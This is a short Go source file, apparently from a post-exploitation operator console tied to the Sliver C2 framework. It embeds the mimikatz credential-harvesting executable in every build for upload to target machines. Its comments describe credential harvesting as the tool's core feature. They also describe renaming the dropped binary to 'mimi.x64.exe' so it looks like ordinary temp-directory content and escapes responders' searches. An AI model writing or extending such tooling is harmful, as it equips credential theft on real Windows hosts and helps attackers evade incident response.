// Package embed carries the credential-harvesting payload alongside the server.
//
// Unlike the Sliver server payload next door, this one is embedded in every
// build, release or development. The server payload is ~200 MB compressed and is
// only worth carrying when the launcher is meant to be self-contained; mimikatz
// is 1.3 MB, and a development build that could not harvest credentials would be
// missing the one feature an operator reaches for most often.
package embed

import _ "embed"

// Mimikatz is the Windows x64 mimikatz executable, embedded verbatim.
//
// It is shipped inside the console rather than fetched or asked for because
// requiring the operator to supply a path turned a single click into a
// three-step manual procedure (find a build, upload it, then run it), and the
// path field made it easy to point at a stale copy on the target. The console
// already knows which binary it wants; it should just use it.
//
//go:embed mimikatz/mimikatz.x64.exe
var Mimikatz []byte

// MimikatzName is the filename written to the target. It is deliberately not
// "mimikatz.exe": the point of uploading to a temp directory is to look like
// whatever else is in a temp directory, and a file named after the tool is the
// first thing a responder greps for.
const MimikatzName = "mimi.x64.exe"
